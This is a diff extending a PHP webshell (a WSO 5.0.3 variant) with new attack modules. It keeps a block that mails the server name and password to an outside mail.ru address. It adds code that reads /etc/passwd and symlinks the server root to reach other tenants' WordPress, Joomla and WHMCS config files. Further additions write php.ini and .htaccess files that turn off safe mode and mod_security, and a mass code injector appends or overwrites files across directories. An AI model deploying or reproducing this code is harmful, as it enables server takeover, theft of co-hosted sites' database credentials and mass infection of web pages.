@@ -1,8 +1,4 @@
 <?php
-//--------------Watching webshell!--------------
-if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'wso', $tmp); // Edit or delete!
-}
 //-----------------Password---------------------
 $_password = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $_agent = true;
@@ -27,10 +23,11 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
-if (PHP_VERSION_ID < 70000)
-	@set_magic_quotes_runtime(0);
+if (function_exists("get_magic_quotes_runtime") && get_magic_quotes_runtime()) {
+	set_magic_quotes_runtime(false);
+}
 @define('VERSION', '5.0.3');
-if(get_magic_quotes_gpc()) {
+if(  ( function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc() ) || ini_get('magic_quotes_sybase')  ){
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
 	}
@@ -237,7 +234,7 @@ function hardHeader() {
 	$opt_charsets = '';
 	foreach($charsets as $microsoft)
 		$opt_charsets .= '<option value="'.$microsoft.'" '.($_POST['charset']==$microsoft?'selected':'').'>'.$microsoft.'</option>';
-	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Anonymizer'=>'Anonymizer','Network'=>'Network');
+	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Injector'=>'Injector','Sql'=>'Sql','Php'=>'Php','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Symlink'=>'Symlink','Bypasser'=>'SafeMode','Safe Mode'=>'Bypass','Anonymizer'=>'Anonymizer','Network'=>'Network');
 	if(!empty($GLOBALS['_password']))
 	$m['Logout'] = 'Logout';
 	$m['Self remove'] = 'SelfRemove';
@@ -282,25 +279,25 @@ function hardFooter() {
 if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
 if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} }
 
-$var_exec = 'exec';
-$var_passthru = 'passthru';
-$var_system = 'system';
-$var_shell_exec = 'shell_exec';
+//--------------Watching webshell!--------------
+if(array_key_exists('watching',$_POST)){
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'wso', $tmp); // Edit or delete!
+}
 
 function ex($in) {
 	$apple = '';
-	if (function_exists($var_exec)) {
+	if (function_exists($var_exec = 'exec')) {
 		@exec($in,$apple);
 		$apple = @join("\n",$apple);
-	} elseif (function_exists($var_passthru)) {
+	} elseif (function_exists($var_passthru = 'passthru')) {
 		ob_start();
 		@passthru($in);
 		$apple = ob_get_clean();
-	} elseif (function_exists($var_system)) {
+	} elseif (function_exists($var_system = 'system')) {
 		ob_start();
 		@system($in);
 		$apple = ob_get_clean();
-	} elseif (function_exists($var_shell_exec)) {
+	} elseif (function_exists($var_shell_exec = 'shell_exec')) {
 		$apple = shell_exec($in);
 	} elseif (is_resource($f = @popen($in,"r"))) {
 		$apple = "";
@@ -451,6 +448,41 @@ function actionSecInfo() {
 		showSecParam('User Accounts', iconv('CP866', 'UTF-8',ex('net user')));
 	}
 	echo '</div>';
+
+	echo '<div class="content">';
+    $sm = ini_get('safe_mode');
+    if($sm) {
+        echo '<br /><b>Error: safe_mode = on</b><br /><br />';
+    } else {
+        @$passwd = file('/etc/passwd','r');
+        if (!$passwd) { 
+            echo '<br /><b>[-] Error : coudn`t read /etc/passwd</b><br /><br />'; 
+        } else {
+            $pub = array();
+            $users = array();
+            $conf = array();
+            $i = 0;
+            foreach($passwd as $p) {
+                $r = explode(':',$p);
+                $dirz = $r[5].'/public_html/';
+                if(strpos($r[5],'home')) {
+                    array_push($users,$r[0]);
+                    if (is_readable($dirz)) {
+                        array_push($pub,$dirz);
+                    }
+                }
+            }
+            echo '<br><br>';
+            echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"."<br />";
+            echo "[+] Founded ".sizeof($pub)." readable public_html directories\n"."<br /><br /><br />";
+            foreach ($pub as $user) {
+                echo $user."<br>";
+            }
+            echo "<br /><br /><br />[+] Complete...\n"."<br />";
+        }
+    }
+    echo '</div>';
+
 	hardFooter();
 }
 /* (С) 10.2012 Svet */
@@ -1138,6 +1170,7 @@ function actionSelfRemove() {
 	echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
 	hardFooter();
 }
+
 function actionInfect() {
 	hardHeader();
 	echo '<h1>Infect</h1><div class=content>';
@@ -1177,6 +1210,380 @@ function actionInfect() {
 		}
 	hardFooter();
 }
+
+
+function actionSymlink() {
+    hardHeader();
+    echo '<h1>Symlink</h1>';
+    $furl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
+    $expld = explode('/',$furl );
+    $burl =str_replace(end($expld),'',$furl);  
+    
+    echo '<div class="content"><center>
+                <h3>[ <a href="#" onclick="g(\'symlink\',null,\'website\',null)">Domains</a> ] - 
+                    [ <a href="#" onclick="g(\'symlink\',null,\'whole\',null)">Whole Server Symlink<sup style="color:red;text-decoration:blink;">New</sup></a> ] - 
+                    [ <a href="#" onclick="g(\'symlink\',null,\'config\',null)">Config files symlink</a> ]</h3></center>';
+    
+    if(isset($_POST['p1']) && $_POST['p1']=='website')
+    {
+        echo "<center>";
+        $d0mains = @file("/etc/named.conf");
+        if(!$d0mains){ 
+            echo "<pre class=ml1 style='margin-top:5px'>Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
+        } else {
+            echo "<table align=center class='main' border=0 ><tr><th> Count </th><th> Domains </th><th> Users </th></tr>";
+            
+            $unk = array();
+            foreach($d0mains as $d0main){
+                if(@eregi("zone",$d0main)){
+                    preg_match_all('#zone "(.*)"#', $d0main, $domains);
+                    flush();
+                    if(strlen(trim($domains[1][0])) > 2){
+                        $unk[] = $domains[1][0];
+                        flush();
+                        
+                    }
+                }
+            }
+            $count=1;
+            $unk = array_unique($unk);
+            $l=0;
+            foreach($unk as $d){
+                $user = posix_getpwuid(@fileowner("/etc/valiases/".$d));
+                echo "<tr".($l?' class=l1':'')."><td>".$count."</td><td><a href=http://".$d."/>".$d."</a></td><td>".$user['name']."</td></tr>";
+                flush();
+                $count++;
+                $l=$l?0:1;
+            }
+            echo "</table>";
+        }
+        echo "</center>"; 
+    }
+ 
+    if(isset($_POST['p1']) && $_POST['p1']=='whole')
+    {
+        echo "<center>";
+        @mkdir('3ca_sym',0777);
+        $hdt  = "Options all\nDirectoryIndex Sux.html\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any";
+        $hfp =@fopen ('3ca_sym/.htaccess','w');
+        fwrite($hfp ,$hdt);
+        if(function_exists('symlink')) {
+            @symlink('/','3ca_sym/root');
+        }
+        $d0mains = @file('/etc/named.conf');
+        if(!$d0mains) {
+            echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
+            echo "<table align='center' width='40%' class='main'><tr><th> Count </th><th> Domains </th><th> User </th><th> Symlink </th></tr>";
+            $dt = file('/etc/passwd');
+            $l=0;
+            foreach($dt as $d) {
+                $r = explode(':',$d);
+                if(strpos($r[5],'home')) {
+                    echo "<tr".($l?' class=l1':'')."><td>".$j."</td><td>---</td><td>".$r[0]."</td><td><a href='3ca_sym/root".$r[5]."/public_html' target='_blank'>symlink</a></td></tr>";
+                    $l=$l?0:1;
+                    $j++;
+                }
+            }            
+            echo '</table>';
+        } else {
+            echo "<table align='center' width='40%' class='main'><tr><th> Count </th><th> Domains </th><th> User </th><th> Symlink </th></tr>";
+            $count=1;
+            $mck = array();
+            foreach($d0mains as $d0main){
+                if(@eregi('zone',$d0main)){
+                    preg_match_all('#zone "(.*)"#',$d0main,$domain);
+                    flush();
+                    if(strlen(trim($domain[1][0])) >2){
+                        $mck[] = $domain[1][0];
+                    }
+                }
+            }
+            $mck = array_unique($mck);
+            $usr = array();
+            $dmn = array();
+            foreach($mck as $o) {
+                $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
+                $usr[] = $infos['name'];
+                $dmn[] = $o;
+            }
+            array_multisort($usr,$dmn);
+            $dt = file('/etc/passwd');
+            $passwd = array();
+            foreach($dt as $d) {
+                $r = explode(':',$d);
+                if(strpos($r[5],'home')) {
+                    $passwd[$r[0]] = $r[5];
+                }
+            }
+            $l=0;
+            $j=1;
+            foreach($usr as $r) {
+                echo "<tr".($l?' class=l1':'')."><td>".$count++."</td>
+                                                 <td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td>
+                                                 <td>'.$r."</td>
+                                                 <td><a href='3ca_sym/root".$passwd[$r]."/public_html' target='_blank'>symlink</a></td></tr>";
+                flush();
+                $l=$l?0:1;
+                $j++;
+            }
+            echo '</table>';
+        }
+        echo "</center>";    
+    }
+ 
+    if(isset($_POST['p1']) && $_POST['p1']=='config')
+    {
+        echo "<center>";
+        @mkdir('3ca_sym',0777);
+        $hdt = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
+        $hfp = @fopen ('3ca_sym/.htaccess','w');
+        @fwrite($hfp ,$hdt);
+        if(function_exists('symlink')) {
+            @symlink('/','3ca_sym/root');
+        }
+        $d0mains = @file('/etc/named.conf');
+        if(!$d0mains) {
+            echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
+        } else {
+            echo "<table align='center' width='40%' class='main' ><tr><th> Count </th><th> Domain </th<th> User </th>><th> Script </th></tr>";
+            $count = 1;
+            $l=0;
+            foreach($d0mains as $d0main){
+                if(@eregi('zone',$d0main)){
+                    preg_match_all('#zone "(.*)"#',$d0main,$domain);
+                    flush();
+                    if(strlen(trim($domain[1][0]))>2){
+                        $user = posix_getpwuid(@fileowner('/etc/valiases/'.$domain[1][0]));
+
+                        $c1 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/wp-config.php';
+                        $ch01 = get_headers($c1);
+                        $cf01 = $ch01[0];
+                        $c2 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/blog/wp-config.php';
+                        $ch02 = get_headers($c2);
+                        $cf02 = $ch02[0];
+                        $c3 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/configuration.php';
+                        $ch03 = get_headers($c3);
+                        $cf03 = $ch03[0];
+                        $c4 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/joomla/configuration.php';
+                        $ch04 = get_headers($c4);
+                        $cf04 = $ch04[0];
+                        $c5 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/includes/config.php';
+                        $ch05 = get_headers($c5);
+                        $cf05 = $ch05[0];
+                        $c6 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/vb/includes/config.php';
+                        $ch06 = get_headers($c6);
+                        $cf06 = $ch06[0];
+                        $c7 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/forum/includes/config.php';
+                        $ch07 = get_headers($c7);
+                        $cf07 = $ch07[0];
+                        $c8 = $burl.'/3ca_sym/root/home/'.$user['name'].'public_html/clients/configuration.php';
+                        $ch08 = get_headers($c8);
+                        $cf08 = $ch08[0];
+                        $c9 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/support/configuration.php';
+                        $ch09 = get_headers($c9);
+                        $cf09 = $ch09[0];
+                        $c10 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/client/configuration.php';
+                        $ch10 = get_headers($c10);
+                        $cf10 = $ch10[0];
+                        $c11 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/submitticket.php';
+                        $ch11 = get_headers($c11);
+                        $cf11 = $ch11[0];
+                        $c12 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/client/configuration.php';
+                        $ch12 = get_headers($c12);
+                        $cf12 = $ch12[0];
+                        $c13 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/includes/configure.php';
+                        $ch13 = get_headers($c13);
+                        $cf13 = $ch13[0];
+                        $c14 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/include/app_config.php';
+                        $ch14 = get_headers($c14);
+                        $cf14 = $ch14[0];
+                        $c15 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/sites/default/settings.php';
+                        $ch15 = get_headers($c15);
+                        $cf15 = $ch15[0];
+                        
+                        $out = '&nbsp;';
+                        if(strpos($cf01,'200') == true)                                    {   $out = "<a href='".$c1."' target='_blank'>Wordpress</a>";   } 
+                        elseif(strpos($cf02,'200') == true)                                {   $out = "<a href='".$c2."' target='_blank'>Wordpress</a>";   }
+                        elseif(strpos($cf03,'200') == true && strpos($cf11,'200') == true) {   $out = " <a href='".$c11."' target='_blank'>WHMCS</a>";     }
+                        elseif(strpos($cf09,'200') == true)                                {   $out = " <a href='".$c9."' target='_blank'>WHMCS</a>";      }
+                        elseif(strpos($cf10,'200') == true)                                {   $out = " <a href='".$c10."' target='_blank'>WHMCS</a>";     }
+                        elseif(strpos($cf03,'200') == true)                                {   $out = " <a href='".$c3."' target='_blank'>Joomla</a>";     }
+                        elseif(strpos($cf04,'200') == true)                                {   $out = " <a href='".$c4."' target='_blank'>Joomla</a>";     }
+                        elseif(strpos($cf05,'200') == true)                                {   $out = " <a href='".$c5."' target='_blank'>vBulletin</a>";  }
+                        elseif(strpos($cf06,'200') == true)                                {   $out = " <a href='".$c6."' target='_blank'>vBulletin</a>";  }
+                        elseif(strpos($cf07,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>vBulletin</a>";  }
+                        elseif(strpos($cf08,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>Client Area</a>";  }
+                        elseif(strpos($cf12,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>Client Area</a>";  }
+                        elseif(strpos($cf13,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>osCommerce/Zen Cart</a>";  }
+                        elseif(strpos($cf14,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>Magento</a>";  }
+                        elseif(strpos($cf15,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>Drupal</a>";  }
+                        else {
+                            continue;
+                        }
+                        echo '<tr'.($l?' class=l1':'').'><td>'.$count++.'</td><td><a href=http://www.'.$domain[1][0].'/>'.$domain[1][0].'</a></td><td>'.$user['name'].'</td><td>'.$out.'</td></tr>';
+                        flush();
+                        $l=$l?0:1;
+                    }
+                }
+            }
+            echo "</table>";
+        }
+        echo "</center>";   
+    }
+    echo "</div>";
+    hardFooter();
+}
+
+function actionBypass() {
+    hardHeader();
+    echo '<h1>Safe Mode</h1>';
+    echo '<div class="content">';
+    echo "<div class=header><center><h3><span>| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => *.sh  ] files create in following dir<br>| ".$GLOBALS['cwd']." |<br><br />";
+    echo '<a href=# onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(Mod) | </a><a href=# onclick="g(null,null,null,null,\'sh\')">| .htaccess(perl) | </a></center>';
+    if(!empty($_POST['p2']) && isset($_POST['p2']))
+    {
+        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
+        fwrite($fil,'<IfModule mod_security.c>
+            Sec------Engine Off
+            Sec------ScanPOST Off
+            </IfModule>');
+        fclose($fil);
+   }
+   if(!empty($_POST['p1'])&& isset($_POST['p1']))
+   {
+        $fil=fopen($GLOBALS['cwd']."php.ini","w");
+        fwrite($fil,'safe_mode=OFF
+            disable_functions=NONE');
+        fclose($fil);
+    }
+    if(!empty($_POST['p3']) && isset($_POST['p3']))
+    {
+        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
+        fwrite($fil,'Options FollowSymLinks MultiViews Indexes ExecCGI
+        AddType application/x-httpd-cgi .sh
+        AddHandler cgi-script .pl
+        AddHandler cgi-script .pl');
+        fclose($fil); 
+    }
+    echo "<br><br /><br /></div>";
+    echo '</div>';
+    hardFooter();
+}
+
+function actionInjector(){
+    hardHeader();
+    echo '<h1>Mass Code Injector</h1>';
+    echo '<div class="content">';
+    
+    if(stristr(php_uname(),"Windows")) { $DS = "\\"; } else if(stristr(php_uname(),"Linux")) { $DS = '/'; }
+    function get_structure($path,$depth) {
+        global $DS;
+        $res = array();
+        if(in_array(0, $depth)) { $res[] = $path; }
+        if(in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
+            $tmp1 = glob($path.$DS.'*',GLOB_ONLYDIR);
+            if(in_array(1, $depth)) { $res = array_merge($res,$tmp1); }
+        }
+        if(in_array(2, $depth) or in_array(3, $depth)) {
+            $tmp2 = array();
+            foreach($tmp1 as $t){
+                $tp2 = glob($t.$DS.'*',GLOB_ONLYDIR);
+                $tmp2 = array_merge($tmp2, $tp2);
+            }
+            if(in_array(2, $depth)) { $res = array_merge($res,$tmp2); }
+        }
+        if(in_array(3, $depth)) {
+            $tmp3 = array();
+            foreach($tmp2 as $t){
+                $tp3 = glob($t.$DS.'*',GLOB_ONLYDIR);
+                $tmp3 = array_merge($tmp3, $tp3);
+            }
+            $res = array_merge($res,$tmp3);
+        }
+        return $res;
+    }
+
+    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
+        $name = $_POST['name'] ? $_POST['name'] : '*';
+        $type = $_POST['type'] ? $_POST['type'] : 'html';
+        $path = $_POST['path'] ? $_POST['path'] : getcwd();
+        $code = $_POST['code'] ? $_POST['code'] : '3xp1r3 Cyber Army';
+        $mode = $_POST['mode'] ? $_POST['mode'] : 'a';
+        $depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
+        $dt = get_structure($path,$depth);
+        foreach ($dt as $d) {
+            if($mode == 'a') {
+                if(file_put_contents($d.$DS.$name.'.'.$type, $code, FILE_APPEND)) {
+                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was injected</span></div>';
+                } else {
+                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
+                }
+            } else {
+                if(file_put_contents($d.$DS.$name.'.'.$type, $code)) {
+                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was injected</span></div>';
+                } else {
+                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
+                }
+            }        
+        }
+    } else {
+        echo '<form method="post" action="">
+                <table align="center">
+                    <tr>
+                        <td>Directory : </td>
+                        <td><input class="box" name="path" value="'.getcwd().'" size="50"/></td>
+                    </tr>
+                    <tr>
+                        <td class="title">Mode : </td>
+                        <td>
+                            <select style="width: 100px;" name="mode" class="box">
+                                <option value="a">Apender</option>
+                                <option value="w">Overwriter</option>
+                            </select>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="title">File Name & Type : </td>
+                        <td>
+                            <input type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
+                            <select style="width: 100px;" name="type" class="box">
+                            <option value="html">HTML</option>
+                            <option value="htm">HTM</option>
+                            <option value="php" selected="selected">PHP</option>
+                            <option value="asp">ASP</option>
+                            <option value="aspx">ASPX</option>
+                            <option value="xml">XML</option>
+                            <option value="txt">TXT</option>
+                        </select></td>
+                    </tr>
+                    <tr>
+                        <td class="title">Code Inject Depth : </td>
+                        <td>
+                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
+                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
+                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
+                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
+                        </td>
+                    </tr>        
+                    <tr>
+                        <td colspan="2"><textarea name="code" cols="70" rows="10" class="box"></textarea></td>
+                    </tr>                        
+                    <tr>
+                        <td colspan="2" style="text-align: center;">
+                            <input type="hidden" name="a" value="Injector">
+                            <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
+                            <input type="hidden" name="p1">
+                            <input type="hidden" name="p2">
+                            <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
+                            <input style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
+                    </tr>
+                </table>
+        </form>';
+    }
+    echo '</div>';
+    hardFooter();
+}
+
 function actionBruteforce() {
 	hardHeader();
 	if( isset($_POST['proto']) ) {
